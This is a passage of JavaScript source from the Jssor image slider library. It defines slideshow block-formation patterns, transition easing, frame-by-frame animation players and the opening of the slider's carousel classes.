                        break;
                    case ROW_DECREASE:
                        r--;
                        break;
                }
            }
        }
        return a;
    };

    $JssorSlideshowFormations$.$FormationStraightStairs = function (transition) {
        var cols = transition.$Cols;
        var rows = transition.$Rows;
        var formationDirection = transition.$Assembly;
        var count = transition.$Count;
        var a = [];
        var i = 0;
        var col = 0;
        var r = 0;
        var cl = cols - 1;
        var rl = rows - 1;
        var il = count - 1;
        var cr;
        switch (formationDirection) {
            case ASSEMBLY_BOTTOM_LEFT:
            case ASSEMBLY_TOP_RIGHT:
            case ASSEMBLY_TOP_LEFT:
            case ASSEMBLY_BOTTOM_RIGHT:
                var C = 0;
                var R = 0;
                break;
            case ASSEMBLY_LEFT_BOTTOM:
            case ASSEMBLY_RIGHT_TOP:
            case ASSEMBLY_LEFT_TOP:
            case ASSEMBLY_RIGHT_BOTTOM:
                var C = cl;
                var R = 0;
                break;
            default:
                formationDirection = ASSEMBLY_RIGHT_BOTTOM;
                var C = cl;
                var R = 0;
                break;
        }
        col = C;
        r = R;
        while (i < count) {
            cr = r + ',' + col;
            if (isToTop(formationDirection) || isToRight(formationDirection)) {
                PushFormationOrder(a, il - i++, [r, col]);
                //a[cr] = il - i++;
            }
            else {
                PushFormationOrder(a, i++, [r, col]);
                //a[cr] = i++;
            }
            switch (formationDirection) {
                case ASSEMBLY_BOTTOM_LEFT:
                case ASSEMBLY_TOP_RIGHT:
                    col--;
                    r++;
                    break;
                case ASSEMBLY_TOP_LEFT:
                case ASSEMBLY_BOTTOM_RIGHT:
                    col++;
                    r--;
                    break;
                case ASSEMBLY_LEFT_BOTTOM:
                case ASSEMBLY_RIGHT_TOP:
                    col--;
                    r--;
                    break;
                case ASSEMBLY_RIGHT_BOTTOM:
                case ASSEMBLY_LEFT_TOP:
                default:
                    col++;
                    r++;
                    break;
            }
            if (col < 0 || r < 0 || col > cl || r > rl) {
                switch (formationDirection) {
                    case ASSEMBLY_BOTTOM_LEFT:
                    case ASSEMBLY_TOP_RIGHT:
                        C++;
                        break;
                    case ASSEMBLY_LEFT_BOTTOM:
                    case ASSEMBLY_RIGHT_TOP:
                    case ASSEMBLY_TOP_LEFT:
                    case ASSEMBLY_BOTTOM_RIGHT:
                        R++;
                        break;
                    case ASSEMBLY_RIGHT_BOTTOM:
                    case ASSEMBLY_LEFT_TOP:
                    default:
                        C--;
                        break;
                }
                if (C < 0 || R < 0 || C > cl || R > rl) {
                    switch (formationDirection) {
                        case ASSEMBLY_BOTTOM_LEFT:
                        case ASSEMBLY_TOP_RIGHT:
                            C = cl;
                            R++;
                            break;
                        case ASSEMBLY_TOP_LEFT:
                        case ASSEMBLY_BOTTOM_RIGHT:
                            R = rl;
                            C++;
                            break;
                        case ASSEMBLY_LEFT_BOTTOM:
                        case ASSEMBLY_RIGHT_TOP: R = rl; C--;
                            break;
                        case ASSEMBLY_RIGHT_BOTTOM:
                        case ASSEMBLY_LEFT_TOP:
                        default:
                            C = 0;
                            R++;
                            break;
                    }
                    if (R > rl)
                        R = rl;
                    else if (R < 0)
                        R = 0;
                    else if (C > cl)
                        C = cl;
                    else if (C < 0)
                        C = 0;
                }
                r = R;
                col = C;
            }
        }
        return a;
    };

    $JssorSlideshowFormations$.$FormationSquare = function (transition) {
        var cols = transition.$Cols || 1;
        var rows = transition.$Rows || 1;
        var arr = [];
        var i = 0;
        var col;
        var r;
        var dc;
        var dr;
        var cr;
        dc = cols < rows ? (rows - cols) / 2 : 0;
        dr = cols > rows ? (cols - rows) / 2 : 0;
        cr = Math.round(Math.max(cols / 2, rows / 2)) + 1;
        for (col = 0; col < cols; col++) {
            for (r = 0; r < rows; r++)
                PushFormationOrder(arr, cr - Math.min(col + 1 + dc, r + 1 + dr, cols - col + dc, rows - r + dr), [r, col]);
        }
        return arr;
    };

    $JssorSlideshowFormations$.$FormationRectangle = function (transition) {
        var cols = transition.$Cols || 1;
        var rows = transition.$Rows || 1;
        var arr = [];
        var i = 0;
        var col;
        var r;
        var cr;
        cr = Math.round(Math.min(cols / 2, rows / 2)) + 1;
        for (col = 0; col < cols; col++) {
            for (r = 0; r < rows; r++)
                PushFormationOrder(arr, cr - Math.min(col + 1, r + 1, cols - col, rows - r), [r, col]);
        }
        return arr;
    };

    $JssorSlideshowFormations$.$FormationRandom = function (transition) {
        var a = [];
        var r, col, i;
        for (r = 0; r < transition.$Rows; r++) {
            for (col = 0; col < transition.$Cols; col++)
                PushFormationOrder(a, Math.ceil(100000 * Math.random()) % 13, [r, col]);
        }

        return a;
    };

    $JssorSlideshowFormations$.$FormationCircle = function (transition) {
        var cols = transition.$Cols || 1;
        var rows = transition.$Rows || 1;
        var arr = [];
        var i = 0;
        var col;
        var r;
        var hc = cols / 2 - 0.5;
        var hr = rows / 2 - 0.5;
        for (col = 0; col < cols; col++) {
            for (r = 0; r < rows; r++)
                PushFormationOrder(arr, Math.round(Math.sqrt(Math.pow(col - hc, 2) + Math.pow(r - hr, 2))), [r, col]);
        }
        return arr;
    };

    $JssorSlideshowFormations$.$FormationCross = function (transition) {
        var cols = transition.$Cols || 1;
        var rows = transition.$Rows || 1;
        var arr = [];
        var i = 0;
        var col;
        var r;
        var hc = cols / 2 - 0.5;
        var hr = rows / 2 - 0.5;
        for (col = 0; col < cols; col++) {
            for (r = 0; r < rows; r++)
                PushFormationOrder(arr, Math.round(Math.min(Math.abs(col - hc), Math.abs(r - hr))), [r, col]);
        }
        return arr;
    };

    $JssorSlideshowFormations$.$FormationRectangleCross = function (transition) {
        var cols = transition.$Cols || 1;
        var rows = transition.$Rows || 1;
        var arr = [];
        var i = 0;
        var col;
        var r;
        var hc = cols / 2 - 0.5;
        var hr = rows / 2 - 0.5;
        var cr = Math.max(hc, hr) + 1;
        for (col = 0; col < cols; col++) {
            for (r = 0; r < rows; r++)
                PushFormationOrder(arr, Math.round(cr - Math.max(hc - Math.abs(col - hc), hr - Math.abs(r - hr))) - 1, [r, col]);
        }
        return arr;
    };

    function GetFormation(transition) {

        var formationInstance = transition.$Formation(transition);

        return transition.$Reverse ? formationInstance.reverse() : formationInstance;

    } //GetFormation

    //var _PrototypeTransitions = [];
    function EnsureTransitionInstance(options, slideshowInterval) {

        var _SlideshowTransition = {
            $Interval: slideshowInterval,  //Delay to play next frame
            $Duration: 1, //Duration to finish the entire transition
            $Delay: 0,  //Delay to assembly blocks
            $Cols: 1,   //Number of columns
            $Rows: 1,   //Number of rows
            $Opacity: 0,   //Fade block or not
            $Zoom: 0,   //Zoom block or not
            $Clip: 0,   //Clip block or not
            $Move: false,   //Move block or not
            $SlideOut: false,   //Slide the previous slide out to display next slide instead
            //$FlyDirection: 0,   //Specify fly transform with direction
            $Reverse: false,    //Reverse the assembly or not
            $Formation: $JssorSlideshowFormations$.$FormationRandom,    //Shape that assembly blocks as
            $Assembly: ASSEMBLY_RIGHT_BOTTOM,   //The way to assembly blocks
            $ChessMode: { $Column: 0, $Row: 0 },    //Chess move or fly direction
            $Easing: $JssorEasing$.$EaseSwing,  //Specify variation of speed during transition
            $Round: {},
            $Blocks: [],
            $During: {}
        };

        $Jssor$.$Extend(_SlideshowTransition, options);

        _SlideshowTransition.$Count = _SlideshowTransition.$Cols * _SlideshowTransition.$Rows;
        if ($Jssor$.$IsFunction(_SlideshowTransition.$Easing))
            _SlideshowTransition.$Easing = { $Default: _SlideshowTransition.$Easing };

        _SlideshowTransition.$FramesCount = Math.ceil(_SlideshowTransition.$Duration / _SlideshowTransition.$Interval);
        _SlideshowTransition.$EasingInstance = GetEasing(_SlideshowTransition);

        _SlideshowTransition.$GetBlocks = function (width, height) {
            width /= _SlideshowTransition.$Cols;
            height /= _SlideshowTransition.$Rows;
            var wh = width + 'x' + height;
            if (!_SlideshowTransition.$Blocks[wh]) {
                _SlideshowTransition.$Blocks[wh] = { $Width: width, $Height: height };
                for (var col = 0; col < _SlideshowTransition.$Cols; col++) {
                    for (var r = 0; r < _SlideshowTransition.$Rows; r++)
                        _SlideshowTransition.$Blocks[wh][r + ',' + col] = { $Top: r * height, $Right: col * width + width, $Bottom: r * height + height, $Left: col * width };
                }
            }

            return _SlideshowTransition.$Blocks[wh];
        };

        if (_SlideshowTransition.$Brother) {
            _SlideshowTransition.$Brother = EnsureTransitionInstance(_SlideshowTransition.$Brother, slideshowInterval);
            _SlideshowTransition.$SlideOut = true;
        }

        return _SlideshowTransition;
    }

    function GetEasing(transition) {
        var easing = transition.$Easing;
        if (!easing.$Default)
            easing.$Default = $JssorEasing$.$EaseSwing;

        var duration = transition.$FramesCount;

        var cache = easing.$Cache;
        if (!cache) {
            var enumerator = $Jssor$.$Extend({}, transition.$Easing, transition.$Round);
            cache = easing.$Cache = {};

            $Jssor$.$Each(enumerator, function (v, easingName) {
                var easingFunction = easing[easingName] || easing.$Default;
                var round = transition.$Round[easingName] || 1;

                if (!$Jssor$.$IsArray(easingFunction.$Cache))
                    easingFunction.$Cache = [];

                var easingFunctionCache = easingFunction.$Cache[duration] = easingFunction.$Cache[duration] || [];

                if (!easingFunctionCache[round]) {
                    easingFunctionCache[round] = [0];
                    for (var t = 1; t <= duration; t++) {
                        var tRound = t / duration * round;
                        var tRoundFloor = Math.floor(tRound);
                        if (tRound != tRoundFloor)
                            tRound -= tRoundFloor;
                        easingFunctionCache[round][t] = easingFunction(tRound);
                    }
                }

                cache[easingName] = easingFunctionCache;

            });
        }

        return cache;
    } //GetEasing

    //Formation Definition -------

    function JssorSlideshowPlayer(slideContainer, slideElement, slideTransition, beginTime, slideContainerWidth, slideContainerHeight) {
        var _Self = this;

        var _Block;
        var _StartStylesArr = {};
        var _AnimationStylesArrs = {};
        var _AnimationBlockItems = [];
        var _StyleStart;
        var _StyleEnd;
        var _StyleDif;
        var _ChessModeColumn = slideTransition.$ChessMode.$Column || 0;
        var _ChessModeRow = slideTransition.$ChessMode.$Row || 0;

        var _Blocks = slideTransition.$GetBlocks(slideContainerWidth, slideContainerHeight);
        var _FormationInstance = GetFormation(slideTransition);
        var _MaxOrder = _FormationInstance.length - 1;
        var _Period = slideTransition.$Duration + slideTransition.$Delay * _MaxOrder;
        var _EndTime = beginTime + _Period;

        var _SlideOut = slideTransition.$SlideOut;
        var _IsIn;

        _EndTime += $Jssor$.$IsBrowserChrome() ? 260 : 50;

        _Self.$EndTime = _EndTime;

        _Self.$ShowFrame = function (time) {
            time -= beginTime;

            var isIn = time < _Period;

            if (isIn || _IsIn) {
                _IsIn = isIn;

                if (!_SlideOut)
                    time = _Period - time;

                var frameIndex = Math.ceil(time / slideTransition.$Interval);

                $Jssor$.$Each(_AnimationStylesArrs, function (value, index) {

                    var itemFrameIndex = Math.max(frameIndex, value.$Min);
                    itemFrameIndex = Math.min(itemFrameIndex, value.length - 1);

                    if (value.$LastFrameIndex != itemFrameIndex) {
                        if (!value.$LastFrameIndex && !_SlideOut) {
                            $Jssor$.$ShowElement(_AnimationBlockItems[index]);
                        }
                        else if (itemFrameIndex == value.$Max && _SlideOut) {
                            $Jssor$.$HideElement(_AnimationBlockItems[index]);
                        }
                        value.$LastFrameIndex = itemFrameIndex;
                        $Jssor$.$SetStylesEx(_AnimationBlockItems[index], value[itemFrameIndex]);
                    }
                });
            }
        };

        function DisableHWA(elmt) {
            $Jssor$.$DisableHWA(elmt);

            var children = $Jssor$.$Children(elmt);

            $Jssor$.$Each(children, function (child) {
                DisableHWA(child);
            });
        }

        //constructor
        {
            slideElement = $Jssor$.$CloneNode(slideElement);
            DisableHWA(slideElement);
            if ($Jssor$.$IsBrowserIe9Earlier()) {
                var hasImage = !slideElement["no-image"];
                var slideChildElements = $Jssor$.$FindChildrenByTag(slideElement);
                $Jssor$.$Each(slideChildElements, function (slideChildElement) {
                    if (hasImage || slideChildElement["jssor-slider"])
                        $Jssor$.$CssOpacity(slideChildElement, $Jssor$.$CssOpacity(slideChildElement), true);
                });
            }

            $Jssor$.$Each(_FormationInstance, function (formationItems, order) {
                $Jssor$.$Each(formationItems, function (formationItem) {
                    var row = formationItem[0];
                    var col = formationItem[1];
                    {
                        var columnRow = row + ',' + col;

                        var chessHorizontal = false;
                        var chessVertical = false;
                        var chessRotate = false;

                        if (_ChessModeColumn && col % 2) {
                            if ($JssorDirection$.$IsHorizontal(_ChessModeColumn)) {
                                chessHorizontal = !chessHorizontal;
                            }
                            if ($JssorDirection$.$IsVertical(_ChessModeColumn)) {
                                chessVertical = !chessVertical;
                            }

                            if (_ChessModeColumn & 16)
                                chessRotate = !chessRotate;
                        }

                        if (_ChessModeRow && row % 2) {
                            if ($JssorDirection$.$IsHorizontal(_ChessModeRow)) {
                                chessHorizontal = !chessHorizontal;
                            }
                            if ($JssorDirection$.$IsVertical(_ChessModeRow)) {
                                chessVertical = !chessVertical;
                            }
                            if (_ChessModeRow & 16)
                                chessRotate = !chessRotate;
                        }

                        slideTransition.$Top = slideTransition.$Top || (slideTransition.$Clip & 4);
                        slideTransition.$Bottom = slideTransition.$Bottom || (slideTransition.$Clip & 8);
                        slideTransition.$Left = slideTransition.$Left || (slideTransition.$Clip & 1);
                        slideTransition.$Right = slideTransition.$Right || (slideTransition.$Clip & 2);

                        var topBenchmark = chessVertical ? slideTransition.$Bottom : slideTransition.$Top;
                        var bottomBenchmark = chessVertical ? slideTransition.$Top : slideTransition.$Bottom;
                        var leftBenchmark = chessHorizontal ? slideTransition.$Right : slideTransition.$Left;
                        var rightBenchmark = chessHorizontal ? slideTransition.$Left : slideTransition.$Right;

                        //$JssorDebug$.$Execute(function () {
                        //    topBenchmark = bottomBenchmark = leftBenchmark = rightBenchmark = false;
                        //});

                        slideTransition.$Clip = topBenchmark || bottomBenchmark || leftBenchmark || rightBenchmark;

                        _StyleDif = {};
                        _StyleEnd = { $Top: 0, $Left: 0, $Opacity: 1, $Width: slideContainerWidth, $Height: slideContainerHeight };
                        _StyleStart = $Jssor$.$Extend({}, _StyleEnd);
                        _Block = $Jssor$.$Extend({}, _Blocks[columnRow]);

                        if (slideTransition.$Opacity) {
                            _StyleEnd.$Opacity = 2 - slideTransition.$Opacity;
                        }

                        if (slideTransition.$ZIndex) {
                            _StyleEnd.$ZIndex = slideTransition.$ZIndex;
                            _StyleStart.$ZIndex = 0;
                        }

                        var allowClip = slideTransition.$Cols * slideTransition.$Rows > 1 || slideTransition.$Clip;

                        if (slideTransition.$Zoom || slideTransition.$Rotate) {
                            var allowRotate = true;
                            if ($Jssor$.$IsBrowserIE() && $Jssor$.$BrowserEngineVersion() < 9) {
                                if (slideTransition.$Cols * slideTransition.$Rows > 1)
                                    allowRotate = false;
                                else
                                    allowClip = false;
                            }

                            if (allowRotate) {
                                _StyleEnd.$Zoom = slideTransition.$Zoom ? slideTransition.$Zoom - 1 : 1;
                                _StyleStart.$Zoom = 1;

                                if ($Jssor$.$IsBrowserIe9Earlier() || $Jssor$.$IsBrowserOpera())
                                    _StyleEnd.$Zoom = Math.min(_StyleEnd.$Zoom, 2);

                                var rotate = slideTransition.$Rotate;

                                _StyleEnd.$Rotate = rotate * 360 * ((chessRotate) ? -1 : 1);
                                _StyleStart.$Rotate = 0;
                            }
                        }

                        if (allowClip) {
                            if (slideTransition.$Clip) {
                                var clipScale = slideTransition.$ScaleClip || 1;
                                var blockOffset = _Block.$Offset = {};
                                if (topBenchmark && bottomBenchmark) {
                                    blockOffset.$Top = _Blocks.$Height / 2 * clipScale;
                                    blockOffset.$Bottom = -blockOffset.$Top;
                                }
                                else if (topBenchmark) {
                                    blockOffset.$Bottom = -_Blocks.$Height * clipScale;
                                }
                                else if (bottomBenchmark) {
                                    blockOffset.$Top = _Blocks.$Height * clipScale;
                                }

                                if (leftBenchmark && rightBenchmark) {
                                    blockOffset.$Left = _Blocks.$Width / 2 * clipScale;
                                    blockOffset.$Right = -blockOffset.$Left;
                                }
                                else if (leftBenchmark) {
                                    blockOffset.$Right = -_Blocks.$Width * clipScale;
                                }
                                else if (rightBenchmark) {
                                    blockOffset.$Left = _Blocks.$Width * clipScale;
                                }
                            }

                            _StyleDif.$Clip = _Block;
                            _StyleStart.$Clip = _Blocks[columnRow];
                        }

                        //fly
                        {
                            var chessHor = chessHorizontal ? 1 : -1;
                            var chessVer = chessVertical ? 1 : -1;

                            if (slideTransition.x)
                                _StyleEnd.$Left += slideContainerWidth * slideTransition.x * chessHor;

                            if (slideTransition.y)
                                _StyleEnd.$Top += slideContainerHeight * slideTransition.y * chessVer;
                        }

                        $Jssor$.$Each(_StyleEnd, function (propertyEnd, property) {
                            if ($Jssor$.$IsNumeric(propertyEnd)) {
                                if (propertyEnd != _StyleStart[property]) {
                                    _StyleDif[property] = propertyEnd - _StyleStart[property];
                                }
                            }
                        });

                        _StartStylesArr[columnRow] = _SlideOut ? _StyleStart : _StyleEnd;

                        var animationStylesArr = [];
                        var virtualFrameCount = Math.round(order * slideTransition.$Delay / slideTransition.$Interval);
                        _AnimationStylesArrs[columnRow] = new Array(virtualFrameCount);
                        _AnimationStylesArrs[columnRow].$Min = virtualFrameCount;

                        var framesCount = slideTransition.$FramesCount;
                        for (var frameN = 0; frameN <= framesCount; frameN++) {
                            var styleFrameN = {};

                            $Jssor$.$Each(_StyleDif, function (propertyDiff, property) {
                                var propertyEasings = slideTransition.$EasingInstance[property] || slideTransition.$EasingInstance.$Default;
                                var propertyEasingArray = propertyEasings[slideTransition.$Round[property] || 1];

                                var propertyDuring = slideTransition.$During[property] || [0, 1];
                                var propertyFrameN = (frameN / framesCount - propertyDuring[0]) / propertyDuring[1] * framesCount;
                                propertyFrameN = Math.round(Math.min(framesCount, Math.max(propertyFrameN, 0)));

                                var propertyEasingValue = propertyEasingArray[propertyFrameN];

                                if ($Jssor$.$IsNumeric(propertyDiff)) {
                                    styleFrameN[property] = _StyleStart[property] + propertyDiff * propertyEasingValue;
                                }
                                else {
                                    var value = styleFrameN[property] = $Jssor$.$Extend({}, _StyleStart[property]);
                                    value.$Offset = [];
                                    $Jssor$.$Each(propertyDiff.$Offset, function (rectX, n) {
                                        var offsetValue = rectX * propertyEasingValue;
                                        value.$Offset[n] = offsetValue;
                                        value[n] += offsetValue;
                                    });
                                }
                            });

                            if (_StyleStart.$Zoom) {
                                styleFrameN.$Transform = { $Rotate: styleFrameN.$Rotate || 0, $Scale: styleFrameN.$Zoom, $OriginalWidth: slideContainerWidth, $OriginalHeight: slideContainerHeight };
                            }
                            if (styleFrameN.$Clip && slideTransition.$Move) {
                                var styleFrameNClipOffset = styleFrameN.$Clip.$Offset;
                                var offsetY = (styleFrameNClipOffset.$Top || 0) + (styleFrameNClipOffset.$Bottom || 0);
                                var offsetX = (styleFrameNClipOffset.$Left || 0) + (styleFrameNClipOffset.$Right || 0);

                                styleFrameN.$Left = (styleFrameN.$Left || 0) + offsetX;
                                styleFrameN.$Top = (styleFrameN.$Top || 0) + offsetY;
                                styleFrameN.$Clip.$Left -= offsetX;
                                styleFrameN.$Clip.$Right -= offsetX;
                                styleFrameN.$Clip.$Top -= offsetY;
                                styleFrameN.$Clip.$Bottom -= offsetY;
                            }

                            styleFrameN.$ZIndex = styleFrameN.$ZIndex || 1;

                            _AnimationStylesArrs[columnRow].push(styleFrameN);
                        }

                    } //for
                });
            });

            _FormationInstance.reverse();
            $Jssor$.$Each(_FormationInstance, function (formationItems) {
                $Jssor$.$Each(formationItems, function (formationItem) {
                    var row = formationItem[0];
                    var col = formationItem[1];

                    var columnRow = row + ',' + col;

                    var image = slideElement;
                    if (col || row)
                        image = $Jssor$.$CloneNode(slideElement);

                    $Jssor$.$SetStyles(image, _StartStylesArr[columnRow]);
                    $Jssor$.$CssOverflow(image, "hidden");

                    $Jssor$.$CssPosition(image, "absolute");
                    slideContainer.$AddClipElement(image);
                    _AnimationBlockItems[columnRow] = image;
                    $Jssor$.$ShowElement(image, !_SlideOut);
                });
            });
        }
    }

    //JssorSlideshowRunner++++++++
    var _SlideshowRunnerCount = 1;
    $JssorSlideshowRunner$ = window.$JssorSlideshowRunner$ = function (slideContainer, slideContainerWidth, slideContainerHeight, slideshowOptions, handleTouchEventOnly) {

        var _SelfSlideshowRunner = this;

        //var _State = 0; //-1 fullfill, 0 clean, 1 initializing, 2 stay, 3 playing
        var _EndTime;

        var _SliderFrameCount;

        var _SlideshowPlayerBelow;
        var _SlideshowPlayerAbove;

        var _PrevItem;
        var _SlideItem;

        var _TransitionIndex = 0;
        var _TransitionsOrder = slideshowOptions.$TransitionsOrder;

        var _SlideshowTransition;

        var _SlideshowPerformance = 8;

        function SlideshowProcessor() {
            var _SelfSlideshowProcessor = this;
            var _CurrentTime = 0;

            $JssorAnimator$.call(_SelfSlideshowProcessor, 0, _EndTime);

            _SelfSlideshowProcessor.$OnPositionChange = function (oldPosition, newPosition) {
                if ((newPosition - _CurrentTime) > _SlideshowPerformance) {
                    _CurrentTime = newPosition;

                    _SlideshowPlayerAbove && _SlideshowPlayerAbove.$ShowFrame(newPosition);
                    _SlideshowPlayerBelow && _SlideshowPlayerBelow.$ShowFrame(newPosition);
                }
            };

            _SelfSlideshowProcessor.$Transition = _SlideshowTransition;
        }

        //member functions
        _SelfSlideshowRunner.$GetTransition = function (slideCount) {
            var n = 0;

            var transitions = slideshowOptions.$Transitions;

            var transitionCount = transitions.length;

            if (_TransitionsOrder) { /*Sequence*/
                //if (transitionCount > slideCount && ($Jssor$.$IsBrowserChrome() || $Jssor$.$IsBrowserSafari() || $Jssor$.$IsBrowserFireFox())) {
                //    transitionCount -= transitionCount % slideCount;
                //}
                n = _TransitionIndex++ % transitionCount;
            }
            else { /*Random*/
                n = Math.floor(Math.random() * transitionCount);
            }

            transitions[n] && (transitions[n].$Index = n);

            return transitions[n];
        };

        _SelfSlideshowRunner.$Initialize = function (slideIndex, prevIndex, slideItem, prevItem, slideshowTransition) {
            $JssorDebug$.$Execute(function () {
                if (_SlideshowPlayerBelow) {
                    $JssorDebug$.$Fail("slideshow runner has not been cleared.");
                }
            });

            _SlideshowTransition = slideshowTransition;

            slideshowTransition = EnsureTransitionInstance(slideshowTransition, _SlideshowPerformance);

            _SlideItem = slideItem;
            _PrevItem = prevItem;

            var prevSlideElement = prevItem.$Item;
            var currentSlideElement = slideItem.$Item;
            prevSlideElement["no-image"] = !prevItem.$Image;
            currentSlideElement["no-image"] = !slideItem.$Image;

            var slideElementAbove = prevSlideElement;
            var slideElementBelow = currentSlideElement;

            var slideTransitionAbove = slideshowTransition;
            var slideTransitionBelow = slideshowTransition.$Brother || EnsureTransitionInstance({}, _SlideshowPerformance);

            if (!slideshowTransition.$SlideOut) {
                slideElementAbove = currentSlideElement;
                slideElementBelow = prevSlideElement;
            }

            var shift = slideTransitionBelow.$Shift || 0;

            _SlideshowPlayerBelow = new JssorSlideshowPlayer(slideContainer, slideElementBelow, slideTransitionBelow, Math.max(shift - slideTransitionBelow.$Interval, 0), slideContainerWidth, slideContainerHeight);
            _SlideshowPlayerAbove = new JssorSlideshowPlayer(slideContainer, slideElementAbove, slideTransitionAbove, Math.max(slideTransitionBelow.$Interval - shift, 0), slideContainerWidth, slideContainerHeight);

            _SlideshowPlayerBelow.$ShowFrame(0);
            _SlideshowPlayerAbove.$ShowFrame(0);

            _EndTime = Math.max(_SlideshowPlayerBelow.$EndTime, _SlideshowPlayerAbove.$EndTime);

            _SelfSlideshowRunner.$Index = slideIndex;
        };

        _SelfSlideshowRunner.$Clear = function () {
            slideContainer.$Clear();
            _SlideshowPlayerBelow = null;
            _SlideshowPlayerAbove = null;
        };

        _SelfSlideshowRunner.$GetProcessor = function () {
            var slideshowProcessor = null;

            if (_SlideshowPlayerAbove)
                slideshowProcessor = new SlideshowProcessor();

            return slideshowProcessor;
        };

        //Constructor
        {
            if ($Jssor$.$IsBrowserIe9Earlier() || $Jssor$.$IsBrowserOpera() || (handleTouchEventOnly && $Jssor$.$WebKitVersion() < 537)) {
                _SlideshowPerformance = 16;
            }

            $JssorObject$.call(_SelfSlideshowRunner);
            $JssorAnimator$.call(_SelfSlideshowRunner, -10000000, 10000000);

            $JssorDebug$.$LiveStamp(_SelfSlideshowRunner, "slideshow_runner_" + _SlideshowRunnerCount++);
        }
    };
    //JssorSlideshowRunner--------

    //JssorSlider
    function JssorSlider(elmt, options) {
        var _SelfSlider = this;

        //private classes
        function Conveyor() {
            var _SelfConveyor = this;
            $JssorAnimator$.call(_SelfConveyor, -100000000, 200000000);

            _SelfConveyor.$GetCurrentSlideInfo = function () {
                var positionDisplay = _SelfConveyor.$GetPosition_Display();
                var virtualIndex = Math.floor(positionDisplay);
                var slideIndex = GetRealIndex(virtualIndex);
                var slidePosition = positionDisplay - Math.floor(positionDisplay);

                return { $Index: slideIndex, $VirtualIndex: virtualIndex, $Position: slidePosition };
            };

            _SelfConveyor.$OnPositionChange = function (oldPosition, newPosition) {

                var index = Math.floor(newPosition);
                if (index != newPosition && newPosition > oldPosition)
                    index++;

                ResetNavigator(index, true);

                _SelfSlider.$TriggerEvent(JssorSlider.$EVT_POSITION_CHANGE, GetRealIndex(newPosition), GetRealIndex(oldPosition), newPosition, oldPosition);
            };
        }

        //Carousel
        function Carousel() {
            var _SelfCarousel = this;

            $JssorAnimator$.call(_SelfCarousel, 0, 0, { $LoopLength: _SlideCount });

            //Carousel Constructor
            {
                $Jssor$.$Each(_SlideItems, function (slideItem) {
                    (_Loop & 1) && slideItem.$SetLoopLength(_SlideCount);
                    _SelfCarousel.$Chain(slideItem);
                    slideItem.$Shift(_ParkingPosition / _StepLength);
                });
            }
        }
        //Carousel

        //Slideshow
        function Slideshow() {
            var _SelfSlideshow = this;
            var _Wrapper = _SlideContainer.$Elmt;

            $JssorAnimator$.call(_SelfSlideshow, -1, 2, { $Easing: $JssorEasing$.$EaseLinear, $Setter: { $Position: SetPosition }, $LoopLength: _SlideCount }, _Wrapper, { $Position: 1 }, { $Position: -1 });

            _SelfSlideshow.$Wrapper = _Wrapper;

            //Slideshow Constructor
            {
                $JssorDebug$.$Execute(function () {
                    $Jssor$.$Attribute(_SlideContainer.$Elmt, "debug-id", "slide_container");
                });
            }
        }
        //Slideshow

        //CarouselPlayer
        function CarouselPlayer(carousel, slideshow) {
            var _SelfCarouselPlayer = this;
            var _FromPosition;
            var _ToPosition;
            var _Duration;
            var _StandBy;
            var _StandByPosition;

            $JssorAnimator$.call(_SelfCarouselPlayer, -100000000, 200000000, { $IntervalMax: 100 });

            _SelfCarouselPlayer.$OnStart = function () {
                _IsSliding = true;
                _LoadingTicket = null;

                //EVT_SWIPE_START
                _SelfSlider.$TriggerEvent(JssorSlider.$EVT_SWIPE_START, GetRealIndex(_Conveyor.$GetPosition()), _Conveyor.$GetPosition());
            };

            _SelfCarouselPlayer.$OnStop = function () {

                _IsSliding = false;
                _StandBy = false;

                var currentSlideInfo = _Conveyor.$GetCurrentSlideInfo();

                //EVT_SWIPE_END
                _SelfSlider.$TriggerEvent(JssorSlider.$EVT_SWIPE_END, GetRealIndex(_Conveyor.$GetPosition()), _Conveyor.$GetPosition());

                if (!currentSlideInfo.$Position) {
                    OnPark(currentSlideInfo.$VirtualIndex, _CurrentSlideIndex);
                }
            };

            _SelfCarouselPlayer.$OnPositionChange = function (oldPosition, newPosition) {

                var toPosition;

                if (_StandBy)
                    toPosition = _StandByPosition;
                else {
                    toPosition = _ToPosition;

                    if (_Duration) {
                        var interPosition = newPosition / _Duration;
                        //if ($Jssor$.$IsBrowserChrome() || $Jssor$.$IsBrowserFireFox()) {
                        //    Math.round(interPosition * 8 / _Duration) / 8 * _Duration;

                        //    if ($Jssor$.$BrowserVersion() < 38)
                        //        interPosition = parseFloat(interPosition.toFixed(4));
                        //}
                        toPosition = _Options.$SlideEasing(interPosition) * (_ToPosition - _FromPosition) + _FromPosition;
                    }
                }

                _Conveyor.$GoToPosition(toPosition);
            };

            _SelfCarouselPlayer.$PlayCarousel = function (fromPosition, toPosition, duration, callback) {
                $JssorDebug$.$Execute(function () {
                    if (_SelfCarouselPlayer.$IsPlaying())
                        $JssorDebug$.$Fail("The carousel is already playing.");
                });

                _FromPosition = fromPosition;
                _ToPosition = toPosition;
                _Duration = duration;

                _Conveyor.$GoToPosition(fromPosition);
                _SelfCarouselPlayer.$GoToPosition(0);

                _SelfCarouselPlayer.$PlayToPosition(duration, callback);
            };

            _SelfCarouselPlayer.$StandBy = function (standByPosition) {
                _StandBy = true;
                _StandByPosition = standByPosition;
                _SelfCarouselPlayer.$Play(standByPosition, null, true);
            };

            _SelfCarouselPlayer.$SetStandByPosition = function (standByPosition) {
                _StandByPosition = standByPosition;
            };

            _SelfCarouselPlayer.$MoveCarouselTo = function (position) {
                _Conveyor.$GoToPosition(position);
            };

            //CarouselPlayer Constructor
            {
                _Conveyor = new Conveyor();

                _Conveyor.$Combine(carousel);
                _Conveyor.$Combine(slideshow);
            }
        }
        //CarouselPlayer

        //SlideContainer
        function SlideContainer() {
            var _Self = this;
            var elmt = CreatePanel();

            $Jssor$.$CssZIndex(elmt, 0);
            $Jssor$.$Css(elmt, "pointerEvents", "none");

            _Self.$Elmt = elmt;

            _Self.$AddClipElement = function (clipElement) {
                $Jssor$.$AppendChild(elmt, clipElement);
                $Jssor$.$ShowElement(elmt);
            };

            _Self.$Clear = function () {
                $Jssor$.$HideElement(elmt);
                $Jssor$.$ClearInnerHtml(elmt);
            };
        }
        //SlideContainer

        //SlideItem
        function SlideItem(slideElmt, slideIndex) {

            var _SelfSlideItem = this;

            var _CaptionSliderIn;
            var _CaptionSliderOut;
            var _CaptionSliderCurrent;
            var _IsCaptionSliderPlayingWhenDragStart;

            var _Wrapper;
            var _BaseElement = slideElmt;

            var _LoadingScreen;

            var _ImageItem;
            var _ImageElmts = [];
            var _LinkItemOrigin;
            var _LinkItem;
            var _ImageLoading;
            var _ImageLoaded;
            var _ImageLazyLoading;
            var _ContentRefreshed;

            var _Processor;

